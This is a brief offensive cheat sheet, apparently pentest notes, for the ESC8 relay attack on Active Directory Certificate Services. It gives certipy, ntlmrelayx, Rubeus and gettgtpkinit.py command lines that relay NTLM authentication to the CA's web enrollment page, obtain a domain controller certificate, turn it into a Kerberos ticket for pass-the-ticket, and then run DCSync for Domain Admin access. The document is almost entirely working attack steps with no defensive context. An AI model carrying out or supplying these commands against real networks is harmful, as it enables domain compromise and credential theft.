# ESC8 - AD CS Relay Attack

## Tools: ntlmrelayx , Rubeus , certipy , gettgtpkinit.py

#### 1) Certipy

 - certipy relay -ca CA_IP -template DomainController

 - certipy auth -pfx CERTIFICATE -dc-ip DC_IP

#### 2) ntlmrelayx

 - ntlmrelayx.py -t http://DC_IP/certsrv/certfnsh.asp -debug -smb2support --adcs --template DomainController

 - Rubeus.exe asktgt /user:USER /certificate:BASE64_CERTIFICATE /ptt

## OR

 - gettgtpkinit.py -pfx base64 $(cat CERT.B64) DOMAIN/DC_NAME$ CCACHE_FILE

### This attack utilizes Pass the Ticket lateral movement, then proceed to DCSync on the DC to gain Domain Admin Access
